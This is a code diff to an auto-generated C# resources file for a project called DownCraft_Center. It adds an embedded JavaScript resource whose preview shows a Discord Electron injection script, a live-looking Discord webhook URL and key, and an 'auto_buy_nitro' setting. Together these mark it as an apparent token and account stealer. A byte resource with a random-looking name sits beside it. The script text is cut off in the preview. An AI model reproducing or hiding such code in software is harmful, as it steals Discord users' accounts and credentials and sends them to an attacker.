@@ -181,6 +181,26 @@ namespace DownCraft_Center.Properties {
         }
         
         /// <summary>
+        ///   Recherche une chaîne localisée semblable à const args = process.argv;
+        ///const fs = require(&apos;fs&apos;);
+        ///const path = require(&apos;path&apos;);
+        ///const https = require(&apos;https&apos;);
+        ///const querystring = require(&apos;querystring&apos;);
+        ///const { BrowserWindow, session } = require(&apos;electron&apos;);
+        ///
+        ///const config = {
+        ///  webhook: &apos;https://discordapp.com/api/webhooks/1046213703462310051/0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD&apos;,
+        ///  webhook_protector_key: &apos;0nSLykWa3zzkmBPiWJfGb8pw2Ui0idLjJFOTexmmB0VGzNWsfRrjx2fOoPN_gXm5jLGD&apos;,
+        ///  auto_buy_nitro: false, 
+        ///  ping [le reste de la chaîne a été tronqué]&quot;;.
+        /// </summary>
+        internal static string index {
+            get {
+                return ResourceManager.GetString("index", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Recherche une ressource localisée de type System.Byte[].
         /// </summary>
         internal static byte[] snuvcdsm {
